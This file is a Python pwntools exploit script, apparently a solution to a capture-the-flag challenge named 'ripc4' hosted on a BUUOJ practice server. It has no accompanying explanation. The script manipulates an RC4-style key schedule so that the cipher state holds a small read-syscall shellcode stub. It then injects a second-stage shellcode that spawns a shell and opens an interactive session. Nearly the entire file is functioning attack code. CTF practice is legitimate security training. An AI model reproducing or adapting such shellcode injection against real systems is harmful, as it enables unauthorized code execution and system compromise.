#coding=utf-8
from pwn import *
import random

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./ripc4')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./ripc4')

else:
    p = remote('node3.buuoj.cn',28819)

def exp():
    sla(p,"type (plain, encoded, encrypted)> ","encrypted")
    sla(p,"command> ","set_key")
    #get key
    state = range(256)
    target = range(256)

    sc = asm('''
            xor edi,edi
            mov rsi,rcx
            mov dh,0x4
            syscall
            ''')
    sc = list(sc)
    shellcode = [ord(item) for item in sc]
    target = filter(lambda c: not c in shellcode, target)

    target = shellcode + target
    sc = ''.join(chr(item) for item in shellcode)
    print disasm(sc)

    key_lis = range(256)
    j = 0
    for i in range(256):
        tg = target[i]
        target_idx = state.index(tg)
        temp = target_idx
        temp += 0x300
        temp -= j
        temp -= state[i]
        j = target_idx & 0xff
        key_lis[i] = temp & 0xff
        state[i],state[j] = state[j],state[i]
    key = ''.join(hex(item)[2:].zfill(2) for item in key_lis)
    print(key)
    sla(p,"key (hex)> ",key)
    #gdb.attach(p,'b* 0x0000555555554000+0x197c')
    sla(p,"command> ","print")

    #get more sc
    sc = '\x90'*len(sc)+asm(shellcraft.amd64.linux.sh())
    raw_input()
    p.sendline(sc)

    p.interactive()

exp()
